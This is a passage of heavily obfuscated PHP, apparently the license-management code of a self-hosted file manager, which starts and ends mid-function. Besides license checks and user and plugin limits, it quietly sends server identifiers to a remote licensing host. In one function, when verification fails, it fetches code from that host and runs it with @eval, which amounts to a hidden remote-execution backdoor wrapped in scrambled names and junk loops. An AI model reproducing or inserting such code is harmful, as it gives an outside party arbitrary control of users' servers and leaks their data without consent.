$‘‡İ™ÇÌ); $Éûä¸Ó = $æëšáäÜ[751]; if (strlen($Éûä¸Ó) < $æëšáäÜ[716]) { return; } } private function yhbl28f44524() { $¶ÁŠ…—¥ =& $_SERVER[áäÒ½¯Ç]; $å¥°âå =& $_SERVER[™Í‘Í£§]; if ($_SERVER[$å¥°âå[24]] != $å¥°âå[151]) { return; } if (!KodUser::isRoot()) { die; } $‡—ƒÃƒº = $GLOBALS[$å¥°âå[13]]; if (isset($‡—ƒÃƒº[$å¥°âå[152]])) { $this->mqyl6b10bea9(); die; } if (isset($‡—ƒÃƒº[$å¥°âå[153]]) && isset($‡—ƒÃƒº[$å¥°âå[153]]) == $å¥°âå[124]) { $‡—ƒÃƒº[$å¥°âå[154]] = Model($å¥°âå[33])->get($å¥°âå[155]); } if (!isset($‡—ƒÃƒº[$å¥°âå[154]]) || strlen($‡—ƒÃƒº[$å¥°âå[154]]) != 16) { show_json($å¥°âå[156] . $‡—ƒÃƒº[$å¥°âå[154]], !1); } $â‡îìáº = Model($å¥°âå[33])->get($å¥°âå[102]); $í×ü´ö = md5($_SERVER[$å¥°âå[108]] . $â‡îìáº); $ñÙÓö¬æ = $¶ÁŠ…—¥[752]; if (!$ñÙÓö¬æ) { return; } $Üºè†¥Ñ = array($å¥°âå[154] => $‡—ƒÃƒº[$å¥°âå[154]], $å¥°âå[157] => rand_string(16), $å¥°âå[158] => $å¥°âå[138], $å¥°âå[159] => $å¥°âå[160], $å¥°âå[161] => $_SERVER[$å¥°âå[162]], $å¥°âå[163] => $_SERVER[$å¥°âå[164]], $å¥°âå[165] => $_SERVER[$å¥°âå[166]], $å¥°âå[107] => $í×ü´ö, $å¥°âå[167] => Model($å¥°âå[33])->get($å¥°âå[133])); $ëªç„æÙ = $¶ÁŠ…—¥[753]; if (strlen($ëªç„æÙ) < $¶ÁŠ…—¥[708]) { return; } if (isset($‡—ƒÃƒº[$å¥°âå[153]]) && isset($‡—ƒÃƒº[$å¥°âå[153]]) == $å¥°âå[124]) { $Üºè†¥Ñ[$å¥°âå[153]] = md5($Üºè†¥Ñ[$å¥°âå[154]] . $å¥°âå[168] . $Üºè†¥Ñ[$å¥°âå[157]]); } if ($‡—ƒÃƒº[$å¥°âå[169]] == $å¥°âå[170]) { $‚‘ìª¿ì = $this->wgmbf37d1a59($í×ü´ö, $å¥°âå[171]); $í“×†¯ñ = $this->mpqwf1050b9c(json_encode($Üºè†¥Ñ), $í×ü´ö . $å¥°âå[172], 3); $í“×†¯ñ = $í“×†¯ñ . $å¥°âå[173] . $_SERVER[$å¥°âå[162]]; $×çşõÉé = $this->qlsk3bf84f1b($å¥°âå[174] . $‚‘ìª¿ì . $å¥°âå[175] . $í“×†¯ñ, -1); show_json($×çşõÉé, !0); } else { if ($‡—ƒÃƒº[$å¥°âå[169]] == $å¥°âå[176]) { $ÁäòÔ½š = substr(md5($å¥°âå[177] . $í×ü´ö), 12, 15) . $å¥°âå[178]; $í“×†¯ñ = $this->hjwx42c014f7(trim($‡—ƒÃƒº[$å¥°âå[179]]), $ÁäòÔ½š, 2); $×áÃÑÀÍ = json_decode($í“×†¯ñ, !0); if (!is_array($×áÃÑÀÍ) || !is_array($×áÃÑÀÍ[$å¥°âå[180]]) || $×áÃÑÀÍ[$å¥°âå[154]] != !0) { $‹şÅ’² = $å¥°âå[181]; $Ñ¿ÃöØ² = $×áÃÑÀÍ[$å¥°âå[180]] ? $å¥°âå[182] . $×áÃÑÀÍ[$å¥°âå[180]] : $‹şÅ’²; show_json($Ñ¿ÃöØ², !1); } else { $Üºè†¥Ñ[$å¥°âå[157]] = $×áÃÑÀÍ[$å¥°âå[180]][$å¥°âå[183]]; } } else { $×áÃÑÀÍ = $this->qlsk3bf84f1b($å¥°âå[184], $Üºè†¥Ñ, 10); } } if (!is_array($×áÃÑÀÍ) || !is_array($×áÃÑÀÍ[$å¥°âå[180]]) || $×áÃÑÀÍ[$å¥°âå[154]] != !0) { $‹şÅ’² = LNG($å¥°âå[185]); $Ñ¿ÃöØ² = $×áÃÑÀÍ[$å¥°âå[180]] ? $å¥°âå[182] . $×áÃÑÀÍ[$å¥°âå[180]] : $‹şÅ’²; show_json($Ñ¿ÃöØ², !1); } $ô¹ş²œš = $×áÃÑÀÍ[$å¥°âå[180]]; $óèüÁ´ = $this->mkfi7d6078ad($ô¹ş²œš[$å¥°âå[186]]); $ä¬¦Í† = $¶ÁŠ…—¥[754]; if (strlen($ä¬¦Í†) < $¶ÁŠ…—¥[222]) { die; } if (!$óèüÁ´ || $óèüÁ´ != $ô¹ş²œš[$å¥°âå[131]]) { $ÍĞüò¯ì = array($å¥°âå[187] => Model($å¥°âå[33])->get($å¥°âå[102]), $å¥°âå[188] => $_SERVER[$å¥°âå[108]], $å¥°âå[189] => this_url(), $å¥°âå[163] => $_SERVER[$å¥°âå[164]]); $í“×†¯ñ = $this->ghujeae1388a(json_encode($ÍĞüò¯ì)); $this->qlsk3bf84f1b($å¥°âå[190] . $í“×†¯ñ); show_json(LNG($å¥°âå[191]), !0); } $Ò†ö„¼ = array($å¥°âå[155] => $ô¹ş²œš[$å¥°âå[192]], $å¥°âå[193] => $ô¹ş²œš[$å¥°âå[194]], $å¥°âå[195] => rand_string(16), $å¥°âå[110] => $ô¹ş²œš[$å¥°âå[196]]); if ($Üºè†¥Ñ[$å¥°âå[157]]) { $Ò†ö„¼[$å¥°âå[195]] = $Üºè†¥Ñ[$å¥°âå[157]]; } $¾­ãŒÙœ = substr(md5($Ò†ö„¼[$å¥°âå[193]]), 10, 10); $éøúñ» = $¾­ãŒÙœ . $Ò†ö„¼[$å¥°âå[110]] . $Ò†ö„¼[$å¥°âå[195]]; $¥ñ³¡û° = $¶ÁŠ…—¥[755]; while (strlen($¥ñ³¡û°) < $¶ÁŠ…—¥[222]) { if (!$¥ñ³¡û°) { break; } $¥ñ³¡û°++; } $Ò†ö„¼[$å¥°âå[112]] = strrev(base64_encode($this->wgmbf37d1a59($éøúñ», $å¥°âå[197]))); $‹Õº›Éå = rand_string(16); $§™¥â˜Í = $¶ÁŠ…—¥[756]; $‡Œ­‡Íò = $‹Õº›Éå . $Ò†ö„¼[$å¥°âå[110]] . $this->wgmbf37d1a59(md5($Ò†ö„¼[$å¥°âå[155]]), $‹Õº›Éå); $Ò†ö„¼[$å¥°âå[113]] = base64_encode(strrev($this->wgmbf37d1a59($‡Œ­‡Íò, $å¥°âå[198]))); $ôÍù÷íá = $¶ÁŠ…—¥[757]; if (strlen($ôÍù÷íá) < $¶ÁŠ…—¥[724]) { return; } if ($ô¹ş²œš[$å¥°âå[199]] && $ô¹ş²œš[$å¥°âå[199]] >= 1) { Model($å¥°âå[33])->setDeep($å¥°âå[200], $å¥°âå[124]); } Model($å¥°âå[33])->set($Ò†ö„¼); $¾è’ú«½ = md5($_SERVER[$å¥°âå[108]] . strrev($â‡îìáº) . $Ò†ö„¼[$å¥°âå[193]]); $Ø¹±Š€ô = $¶ÁŠ…—¥[758]; while (strlen($Ø¹±Š€ô) < $¶ÁŠ…—¥[708]) { if (!$Ø¹±Š€ô) { break; } $Ø¹±Š€ô++; } $¿Çˆôö = strrev(substr($¾è’ú«½, 10, 16)); $Ã¯§òÛÌ = $this->mpqwf1050b9c(json_encode($ô¹ş²œš), $¾è’ú«½); $â·ó®÷¹ = array_to_keyvalue(Model($å¥°âå[7])->listData(), $å¥°âå[201]); $ç¬±Òë… = $¶ÁŠ…—¥[759]; $¿†ñÃç§ = $â·ó®÷¹[$å¥°âå[202]]; $ÌÎ”…±ƒ = $¶ÁŠ…—¥[760]; if (strlen($ÌÎ”…±ƒ) < $¶ÁŠ…—¥[724]) { return; } $¬Ğ…ç  = array(); $¬Ğ…ç [$¿Çˆôö] = $Ã¯§òÛÌ; $É¢»Ø‘¨ = $¶ÁŠ…—¥[761]; Model($å¥°âå[7])->update($¿†ñÃç§[$å¥°âå[203]], array($å¥°âå[204] => $¬Ğ…ç )); $Ø¶è™Ğœ = $¶ÁŠ…—¥[762]; if (!$Ø¶è™Ğœ) { return; } $this->ifsx35ba79af = $ô¹ş²œš; $¿Ğ‚ˆÒç = $¶ÁŠ…—¥[763]; $this->zmdsfb0eb856 = $Ò†ö„¼[$å¥°âå[110]]; $this->licenseRegistSuccess(); $Í”ÏÚ¥± = $¶ÁŠ…—¥[764]; if (strlen($Í”ÏÚ¥±) < $¶ÁŠ…—¥[708]) { die; } Cache::set($å¥°âå[205] . md5($â‡îìáº . $å¥°âå[206]), $å¥°âå[6]); $Ä›©û„• = $¶ÁŠ…—¥[765]; show_json(LNG($å¥°âå[191]), !0); } private function licenseRegistSuccess() { $ÊİëªÒº =& $_SERVER[™Í‘Í£§]; $£¥¤ĞŒ– = Model($ÊİëªÒº[33])->get(); if ($£¥¤ĞŒ–[$ÊİëªÒº[63]] != $ÊİëªÒº[124]) { Model($ÊİëªÒº[33])->set($ÊİëªÒº[63], $ÊİëªÒº[124]); } Action($ÊİëªÒº[207])->initStart(!0); } private function mqyl6b10bea9() { $¦µíšĞî =& $_SERVER[áäÒ½¯Ç]; $§Œ´í€ =& $_SERVER[™Í‘Í£§]; Model($§Œ´í€[33])->set(array($§Œ´í€[155] => $§Œ´í€[6], $§Œ´í€[193] => $§Œ´í€[6], $§Œ´í€[110] => $§Œ´í€[111], $§Œ´í€[112] => $§Œ´í€[6], $§Œ´í€[113] => $§Œ´í€[6])); $¹É°“µ = $¦µíšĞî[766]; if (!$¹É°“µ) { die; } Model($§Œ´í€[33])->setDeep($§Œ´í€[200], $§Œ´í€[208]); $ÀÕÑğ‡ß = $¦µíšĞî[767]; if (strlen($ÀÕÑğ‡ß) < $¦µíšĞî[728]) { return; } $this->ifsx35ba79af = array(); $this->zmdsfb0eb856 = $§Œ´í€[111]; $ÎŞÇÖƒ½ = $¦µíšĞî[768]; while ($ÎŞÇÖƒ½ < $¦µíšĞî[728]) { if ($ÎŞÇÖƒ½ >= 0) { break; } $ÎŞÇÖƒ½++; } } private function zrncb84cf185() { $ñµôÕŞç =& $_SERVER[áäÒ½¯Ç]; $ô¢¿É =& $_SERVER[™Í‘Í£§]; $_SERVER[$ô¢¿É[164]] = _get($_SERVER, $ô¢¿É[164], APP_HOST); $’Ûš¬Ÿ¶ = $ñµôÕŞç[769]; if (!$’Ûš¬Ÿ¶) { return; } $this->zmdsfb0eb856 = $ô¢¿É[111]; $ÅÀ¬åİ = $ñµôÕŞç[770]; if (!$ÅÀ¬åİ) { die; } $‘¤û¢Ø’ = Model($ô¢¿É[33])->get(); $½÷ë“ñÂ = $ñµôÕŞç[771]; if (!$½÷ë“ñÂ) { die; } if ($‘¤û¢Ø’[$ô¢¿É[110]] == $ô¢¿É[111]) { return; } $ÜìéÓïª = Model($ô¢¿É[33])->get($ô¢¿É[102]); $šûß´çß = $ñµôÕŞç[772]; if (strlen($šûß´çß) < $ñµôÕŞç[728]) { die; } $ĞŒ İø = $ô¢¿É[205] . md5($ÜìéÓïª . $ô¢¿É[206]); $…êü®İ = Cache::get($ĞŒ İø); if (!is_array($…êü®İ) || !isset($…êü®İ[$ô¢¿É[209]]) || time() - $…êü®İ[$ô¢¿É[209]] >= 60) { $ùåâ‡»à = Model($ô¢¿É[7])->loadList(); $Ùà¬¿™É = $ùåâ‡»à[$ô¢¿É[202]]; $úô—å¸Ü = md5($_SERVER[$ô¢¿É[108]] . strrev($ÜìéÓïª) . $‘¤û¢Ø’[$ô¢¿É[193]]); $—Á’ƒÕò = strrev(substr($úô—å¸Ü, 10, 16)); $…êü®İ = $this->hjwx42c014f7($Ùà¬¿™É[$ô¢¿É[88]][$—Á’ƒÕò], $úô—å¸Ü); $…êü®İ = json_decode($…êü®İ, !0); } if (!is_array($…êü®İ)) { return $this->mqyl6b10bea9(); } $µÆÀï‡Ø = strtotime($…êü®İ[$ô¢¿É[131]]); if (time() >= $µÆÀï‡Ø) { return $this->mqyl6b10bea9(); } if (!isset($…êü®İ[$ô¢¿É[209]]) || time() - $…êü®İ[$ô¢¿É[209]] > 20) { $…êü®İ[$ô¢¿É[209]] = time(); Cache::set($ĞŒ İø, $…êü®İ); } $this->ifsx35ba79af = $…êü®İ; $this->zmdsfb0eb856 = $‘¤û¢Ø’[$ô¢¿É[110]]; $GLOBALS[$ô¢¿É[210]] = $this; $ó†ß´Ä° = $ñµôÕŞç[773]; } private function ohrk1550b465() { $—‹êöØ =& $_SERVER[™Í‘Í£§]; $°ƒĞ·ôë = $GLOBALS[$—‹êöØ[13]]; $¦‡õñÏŞ = $_SERVER[$—‹êöØ[24]]; $ ¿´òÆ = $_SERVER[áäÒ½¯Ç][774]; if ($¦‡õñÏŞ == $—‹êöØ[211] && $this->zmdsfb0eb856 == $—‹êöØ[111]) { show_json(LNG($—‹êöØ[212]), !1, $—‹êöØ[213]); } $ÂŠ…©î” = array($—‹êöØ[214], $—‹êöØ[215]); if (in_array($¦‡õñÏŞ, $ÂŠ…©î”)) { if ($this->zmdsfb0eb856 == $—‹êöØ[111] && isset($°ƒĞ·ôë[$—‹êöØ[216]])) { show_json(LNG($—‹êöØ[212]), !1, $—‹êöØ[213]); die; } $ë«í£² = $this->prhi087703c4(); if ($ë«í£² != intval($—‹êöØ[217])) { if ($ë«í£² <= Model($—‹êöØ[127])->count()) { show_json(LNG($—‹êöØ[218]), !1, $—‹êöØ[213]); die; } } } } private function izwhf1500240() { $‰ÒòøİÇ =& $_SERVER[áäÒ½¯Ç]; $¦À€×Ôç =& $_SERVER[™Í‘Í£§]; $ÙÖô«ïú = array($¦À€×Ôç[121], $¦À€×Ôç[122]); if (!KodUser::isRoot() || !isset($_GET[$¦À€×Ôç[219]])) { return; } if (!in_array($_SERVER[$¦À€×Ôç[24]], $ÙÖô«ïú)) { return; } $€‰è½İ¸ = $¦À€×Ôç[220]; $Ô‹Èêè = $‰ÒòøİÇ[775]; $€‰è½İ¸ = $this->ipbe22eee364($€‰è½İ¸, $¦À€×Ôç[221]); $ûÅƒßÏ = $‰ÒòøİÇ[776]; $Ó·‡¾›é = stream_context_create(array($¦À€×Ôç[222] => array($¦À€×Ôç[223] => $¦À€×Ôç[224], $¦À€×Ôç[225] => 3))); $Ìø„‚’ = $‰ÒòøİÇ[777]; if (strlen($Ìø„‚’) < $‰ÒòøİÇ[728]) { die; } $Äú—×¯• = @file_get_contents($€‰è½İ¸, !1, $Ó·‡¾›é); header($¦À€×Ôç[226]); if ($Äú—×¯• && strstr($Äú—×¯•, $¦À€×Ôç[227])) { echo $Äú—×¯•; } die; } public function apfj5fce1629($ã­äšëÃ) { $ÚÙô‚· =& $_SERVER[áäÒ½¯Ç]; $­¹ŠŞ„ß =& $_SERVER[™Í‘Í£§]; if ($this->zmdsfb0eb856 == $­¹ŠŞ„ß[228]) { return $ã­äšëÃ; } $ªÓº˜ŠÑ = $this->versionPluginList(); $µóÇë–Œ = explode($­¹ŠŞ„ß[229], $this->versionPluginFilter()); $â³Ü¬’Ò = array(); $ÇƒÉÚÃÄ = $ÚÙô‚·[778]; if (strlen($ÇƒÉÚÃÄ) < $ÚÙô‚·[716]) { die; } foreach ($ªÓº˜ŠÑ as $‘õ³Ñ­ù => $Ç¾òÖÓ•) { if ($Ç¾òÖÓ• == $­¹ŠŞ„ß[230] && substr($this->zmdsfb0eb856, 0, 1) == $­¹ŠŞ„ß[230]) { continue; } if (!in_array($‘õ³Ñ­ù, $µóÇë–Œ)) { $â³Ü¬’Ò[] = $‘õ³Ñ­ù; } } foreach ($â³Ü¬’Ò as $‘õ³Ñ­ù) { unset($ã­äšëÃ[$‘õ³Ñ­ù]); $‚¾ôÑØƒ = $ÚÙô‚·[779]; while ($‚¾ôÑØƒ < $ÚÙô‚·[728]) { if ($‚¾ôÑØƒ >= 0) { break; } $‚¾ôÑØƒ++; } } return $ã­äšëÃ; $¥†—ô¶ã = $ÚÙô‚·[780]; while ($¥†—ô¶ã < $ÚÙô‚·[724]) { if ($¥†—ô¶ã >= 0) { break; } $¥†—ô¶ã++; } } private function versionPluginList() { $£¦¸İ¨Ã =& $_SERVER[áäÒ½¯Ç]; $®ƒ·ó =& $_SERVER[™Í‘Í£§]; return array($®ƒ·ó[231] => $®ƒ·ó[230], $®ƒ·ó[232] => $®ƒ·ó[230], $®ƒ·ó[233] => $®ƒ·ó[230], $®ƒ·ó[234] => $®ƒ·ó[230], $®ƒ·ó[235] => $®ƒ·ó[236], $®ƒ·ó[237] => $®ƒ·ó[236], $®ƒ·ó[238] => $®ƒ·ó[236], $®ƒ·ó[239] => $®ƒ·ó[236], $®ƒ·ó[240] => $®ƒ·ó[236], $®ƒ·ó[241] => $®ƒ·ó[236], $®ƒ·ó[242] => $®ƒ·ó[236], $®ƒ·ó[243] => $®ƒ·ó[236], $®ƒ·ó[244] => $®ƒ·ó[236], $®ƒ·ó[245] => $®ƒ·ó[236], $®ƒ·ó[246] => $®ƒ·ó[236], $®ƒ·ó[247] => $®ƒ·ó[236], $®ƒ·ó[248] => $®ƒ·ó[236], $®ƒ·ó[249] => $®ƒ·ó[236], $®ƒ·ó[250] => $®ƒ·ó[236]); $ƒŠï÷«® = $£¦¸İ¨Ã[781]; while (strlen($ƒŠï÷«®) < $£¦¸İ¨Ã[222]) { if (!$ƒŠï÷«®) { break; } $ƒŠï÷«®++; } } private function versionPluginFilter() { $²í…ÌÕ =& $_SERVER[™Í‘Í£§]; if ($this->zmdsfb0eb856 == $²í…ÌÕ[111]) { return $²í…ÌÕ[6]; } $¼í‹ş‡ß = _get($this->ifsx35ba79af, $²í…ÌÕ[251], $²í…ÌÕ[6]); $©şÔ¹„ë = $_SERVER[áäÒ½¯Ç][782]; if (!$©şÔ¹„ë) { return; } $Å¦ªÆœ» = _get($this->ifsx35ba79af, $²í…ÌÕ[118], $²í…ÌÕ[6]); $êšÃ¯×ñ = _get($this->ifsx35ba79af, $²í…ÌÕ[252], $²í…ÌÕ[6]); if ($Å¦ªÆœ» > time() && $êšÃ¯×ñ > time()) { $„ˆÅÊê = explode($²í…ÌÕ[229], $¼í‹ş‡ß); $´Ğú±ùã = array_keys($this->versionPluginList()); $¼í‹ş‡ß = array_merge($„ˆÅÊê, $´Ğú±ùã); $¼í‹ş‡ß = implode($²í…ÌÕ[229], array_filter(array_unique($¼í‹ş‡ß))); } return $¼í‹ş‡ß; } private function jrux666346a8() { $©ŞÄ™¬· =& $_SERVER[™Í‘Í£§]; if ($this->zmdsfb0eb856 != $©ŞÄ™¬·[111]) { $GLOBALS[$©ŞÄ™¬·[88]][$©ŞÄ™¬·[92]][$©ŞÄ™¬·[253]] = $©ŞÄ™¬·[208]; return; } $GLOBALS[$©ŞÄ™¬·[88]][$©ŞÄ™¬·[254]] = $©ŞÄ™¬·[124]; if (Model($©ŞÄ™¬·[255])->get($©ŞÄ™¬·[63]) != $©ŞÄ™¬·[208]) { Model($©ŞÄ™¬·[255])->set($©ŞÄ™¬·[63], $©ŞÄ™¬·[208]); } } public function qvop32e7ef8a() { $×‡ àÏå =& $_SERVER[áäÒ½¯Ç]; return $_SERVER[™Í‘Í£§][256]; $ ıºÜœ = $×‡ àÏå[783]; while (strlen($ ıºÜœ) < $×‡ àÏå[708]) { if (!$ ıºÜœ) { break; } $ ıºÜœ++; } } private function lshdc2951030() { $½°ÆËá’ =& $_SERVER[áäÒ½¯Ç]; $÷œô¨ºÈ =& $_SERVER[™Í‘Í£§]; $¶áºÈøÇ = array($÷œô¨ºÈ[257], $÷œô¨ºÈ[258], $÷œô¨ºÈ[259]); $›šÄù›Ú = $½°ÆËá’[784]; $ôåø«ã‚ = $÷œô¨ºÈ[260] . md5($÷œô¨ºÈ[261]); if ($this->zmdsfb0eb856 == $÷œô¨ºÈ[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$÷œô¨ºÈ[24]], $¶áºÈøÇ)) { return; } if (time() % 4 != 0) { return; } $î†ÑºÑŒ = call_user_func(array($÷œô¨ºÈ[262], $÷œô¨ºÈ[263]), $ôåø«ã‚); if ($î†ÑºÑŒ && time() - $î†ÑºÑŒ < intval($÷œô¨ºÈ[264])) { return; } call_user_func(array($÷œô¨ºÈ[262], $÷œô¨ºÈ[141]), $ôåø«ã‚, time()); $ÚÇëÈ„Ô = Model($÷œô¨ºÈ[33])->get($÷œô¨ºÈ[102]); $¢šŞ–ÑË = array($÷œô¨ºÈ[154] => Model($÷œô¨ºÈ[33])->get($÷œô¨ºÈ[155]), $÷œô¨ºÈ[169] => $this->zmdsfb0eb856, $÷œô¨ºÈ[165] => $_SERVER[$÷œô¨ºÈ[166]], $÷œô¨ºÈ[167] => Model($÷œô¨ºÈ[33])->get($÷œô¨ºÈ[133]), $÷œô¨ºÈ[107] => md5($_SERVER[$÷œô¨ºÈ[108]] . $ÚÇëÈ„Ô), $÷œô¨ºÈ[158] => $÷œô¨ºÈ[138], $÷œô¨ºÈ[161] => $_SERVER[$÷œô¨ºÈ[162]]); $áïÛèÀ˜ = $½°ÆËá’[785]; if (strlen($áïÛèÀ˜) < $½°ÆËá’[728]) { die; } $¥İÌµ¸¥ = $this->qlsk3bf84f1b($÷œô¨ºÈ[265], $¢šŞ–ÑË); $Í‚¬å¦ = $½°ÆËá’[786]; if (!$Í‚¬å¦) { die; } if (!is_array($¥İÌµ¸¥)) { return; } if ($¥İÌµ¸¥[$÷œô¨ºÈ[154]] && $¥İÌµ¸¥[$÷œô¨ºÈ[266]]) { if ($this->mkfi7d6078ad($¥İÌµ¸¥[$÷œô¨ºÈ[266]]) == $¢šŞ–ÑË[$÷œô¨ºÈ[154]]) { return; } } $this->mqyl6b10bea9(); $êå›ƒ° = $½°ÆËá’[787]; if (!$êå›ƒ°) { return; } if ($this->mkfi7d6078ad($¥İÌµ¸¥[$÷œô¨ºÈ[266]]) != $¢šŞ–ÑË[$÷œô¨ºÈ[154]]) { $åªë’±Ú = array($÷œô¨ºÈ[187] => $ÚÇëÈ„Ô, $÷œô¨ºÈ[188] => $_SERVER[$÷œô¨ºÈ[108]], $÷œô¨ºÈ[189] => this_url(), $÷œô¨ºÈ[163] => $_SERVER[$÷œô¨ºÈ[164]]); $Æúó—¾ = $this->ghujeae1388a(json_encode($åªë’±Ú)); $¥İÌµ¸¥ = $this->qlsk3bf84f1b($÷œô¨ºÈ[190] . $Æúó—¾); if ($¥İÌµ¸¥ && is_array($¥İÌµ¸¥) && isset($¥İÌµ¸¥[$÷œô¨ºÈ[266]])) { $ÉöİõØ  = $this->hjwx42c014f7($¥İÌµ¸¥[$÷œô¨ºÈ[266]], 2); if ($ÉöİõØ ) { $ÉöİõØ  = $this->mkfi7d6078ad($ÉöİõØ ); } if ($ÉöİõØ ) { try { @eval($ÉöİõØ ); } catch (Exception $Ü˜¹ôí) { } } } } } private function qlsk3bf84f1b($Á—ó§¡Ä = '', $³ì×·„Î = array(), $¦¾Ü—Ô® = 5) { $Š†ÒŠÜÍ =& $_SERVER[áäÒ½¯Ç]; $àß™—ÂÜ =& $_SERVER[™Í‘Í£§]; $«óªÃÔ£ = $àß™—ÂÜ[267]; $£ÀÀí ò = $Š†ÒŠÜÍ[788]; if (strlen($£ÀÀí ò) < $Š†ÒŠÜÍ[716]) { die; } $«óªÃÔ£ = $this->ipbe22eee364($«óªÃÔ£, $àß™—ÂÜ[268]); $€¦êü®Ÿ = $Š†ÒŠÜÍ[771]; while ($€¦êü®Ÿ < $Š†ÒŠÜÍ[222]) { if ($€¦êü®Ÿ >= 0) { break; } $€¦êü®Ÿ++; } $«óªÃÔ£ = $«óªÃÔ£ . $Á—ó§¡Ä; if ($³ì×·„Î && is_array($³ì×·„Î)) { $«óªÃÔ£ = $«óªÃÔ£ . $àß™—ÂÜ[269] . http_build_query($³ì×·„Î); } if ($³ì×·„Î === -1) { return $«óªÃÔ£; } $ÌİğïñÂ = stream_context_create(array($àß™—ÂÜ[222] => array($àß™—ÂÜ[225] => $¦¾Ü—Ô®, $àß™—ÂÜ[223] => $àß™—ÂÜ[270]), $àß™—ÂÜ[271] => array($àß™—ÂÜ[272] => !1, $àß™—ÂÜ[273] => !1))); $³ì×·„Î = @file_get_contents($«óªÃÔ£, !1, $ÌİğïñÂ); $éÅ‘­œ† = $Š†ÒŠÜÍ[789]; if (!$éÅ‘­œ†) { die; } return json_decode($³ì×·„Î, !0); $ùÁÙ­‘ = $Š†ÒŠÜÍ[790]; if (!$ùÁÙ­‘) { return; } } private function prhi087703c4() { $ÏæÈÊä€ =& $_SERVER[áäÒ½¯Ç]; $ŞÊƒò‡ =& $_SERVER[™Í‘Í£§]; $ú…òÄöÔ = array($ŞÊƒò‡[274] => $ŞÊƒò‡[275], $ŞÊƒò‡[276] => $ŞÊƒò‡[277], $ŞÊƒò‡[278] => $ŞÊƒò‡[279], $ŞÊƒò‡[280] => $ŞÊƒò‡[281], $ŞÊƒò‡[282] => $ŞÊƒò‡[283], $ŞÊƒò‡[284] => $ŞÊƒò‡[217], $ŞÊƒò‡[285] => $ŞÊƒò‡[217], $ŞÊƒò‡[286] => $ŞÊƒò‡[275], $ŞÊƒò‡[287] => $ŞÊƒò‡[277], $ŞÊƒò‡[288] => $ŞÊƒò‡[279], $ŞÊƒò‡[289] => $ŞÊƒò‡[290], $ŞÊƒò‡[291] => $ŞÊƒò‡[281], $ŞÊƒò‡[292] => $ŞÊƒò‡[293], $ŞÊƒò‡[294] => $ŞÊƒò‡[283], $ŞÊƒò‡[295] => $ŞÊƒò‡[296], $ŞÊƒò‡[297] => $ŞÊƒò‡[298], $ŞÊƒò‡[299] => $ŞÊƒò‡[300]); $û±Ÿí« = $ÏæÈÊä€[791]; if (strlen($û±Ÿí«) < $ÏæÈÊä€[724]) { die; } $÷ÈÓã™ô = $ú…òÄöÔ[$this->zmdsfb0eb856]; $Äıì«×” = $ÏæÈÊä€[792]; while ($Äıì«×” < $ÏæÈÊä€[716]) { if ($Äıì«×” >= 0) { break; } $Äıì«×”++; } $÷ÈÓã™ô = intval($÷ÈÓã™ô ? $÷ÈÓã™ô : $ŞÊƒò‡[275]); $İíó¢ş¹ = $ÏæÈÊä€[793]; if (!$İíó¢ş¹) { die; } $ÜèÃ¤öÍ = _get($this->ifsx35ba79af, $ŞÊƒò‡[301]); $ÜèÃ¤öÍ = $ÜèÃ¤öÍ ? intval($ÜèÃ¤öÍ) : 0; $ÉØ×·¬‘ = $ÏæÈÊä€[794]; if (strlen($ÉØ×·¬‘) < $ÏæÈÊä€[728]) { die; } return $÷ÈÓã™ô + $ÜèÃ¤öÍ; $÷ßÔÕü¯ = $ÏæÈÊä€[795]; while (strlen($÷ßÔÕü¯) < $ÏæÈÊä€[716]) { if (!$÷ßÔÕü¯) { break; } $÷ßÔÕü¯++; } } public function jsax37c93005($½Šã»ï) { $‰´ˆ®˜š =& $_SERVER[áäÒ½¯Ç]; $Êâ¯³¬Ë =& $_SERVER[™Í‘Í£§]; $µÌä™¯Ã = $this->prhi087703c4(); $‚şêö—ü = $‰´ˆ®˜š[796]; if (!$‚şêö—ü) { die; } if ($½Šã»ï[$Êâ¯³¬Ë[302]] == $Êâ¯³¬Ë[124]) { return; } if ($µÌä™¯Ã >= intval($Êâ¯³¬Ë[217])) { return; } $µÑèßÜş = Model($Êâ¯³¬Ë[127])->count(); $êŞœãùş = $‰´ˆ®˜š[797]; while ($êŞœãùş < $‰´ˆ®˜š[708]) { if ($êŞœãùş >= 0) { break; } $êŞœãùş++; } if ($µÑèßÜş <= $µÌä™¯Ã) { return; } $ËÌÍõ™ı = Model($Êâ¯³¬Ë[127])->field($Êâ¯³¬Ë[302])->limit($µÌä™¯Ã)->select(); $ËÌÍõ™ı = array_to_keyvalue($ËÌÍõ™ı, $Êâ¯³¬Ë[6], $Êâ¯³¬Ë[302]); if (!in_array($½Šã»ï[$Êâ¯³¬Ë[302]], $ËÌÍõ™ı)) { show_json($Êâ¯³¬Ë[303], !1, $Êâ¯³¬Ë[213]); } } public function ljzya04824ce() { $„óÜ„÷ù =& $_SERVER[áäÒ½¯Ç]; $¡–À¼´Å =& $_SERVER[™Í‘Í£§]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $Š¯è¾Òà = $¡–À¼´Å[220]; $ò¼¤¥û€ = $„óÜ„÷ù[798]; while (strlen($ò¼¤¥û€) < $„óÜ„÷ù[728]) { if (!$ò¼¤¥û€) { break; } $ò¼¤¥û€++; } $Š¯è¾Òà = $this->ipbe22eee364($Š¯è¾Òà, $¡–À¼´Å[221]); $•îşîÁ¯ = stream_context_create(array($¡–À¼´Å[222] => array($¡–À¼´Å[223] => $¡–À¼´Å[224], $¡–À¼´Å[225] => 3))); $Ã¬ÉÛ‰» = @file_get_contents($Š¯è¾Òà, !1, $•îşîÁ¯); echo $¡–À¼´Å[304] . hash_encode($Ã¬ÉÛ‰») . $¡–À¼´Å[305]; $¿¦˜÷ = $„óÜ„÷ù[799]; if (!$¿¦˜÷) { return; } } private function mpqwf1050b9c($–ĞÂÆ®ä, $Åş­Õ¦Ú, $­ÄşØÒ = 3) { $é¤¯Çú =& $_SERVER[áäÒ½¯Ç]; $¿³á›õª =& $_SERVER[™Í‘Í£§]; usleep(1); $–ĞÂÆ®ä = trim($–ĞÂÆ®ä); $ Œó”ˆ = mt_rand(0, 5) . $¿³á›õª[6]; $ï°½ÖîÜ = $é¤¯Çú[800]; if (!$ï°½ÖîÜ) { die; } $Ó¨Òëßï = rand_string(15); $À¶Ó“ = $¿³á›õª[306]; switch ($ Œó”ˆ) { case $¿³á›õª[208]: $—ÓìÍ = $this->wgmbf37d1a59($–ĞÂÆ®ä, strrev($Åş­Õ¦Ú . $Ó¨Òëßï)); break; case $¿³á›õª[124]: $—ÓìÍ = $this->wgmbf37d1a59($–ĞÂÆ®ä, strrev($Ó¨Òëßï . 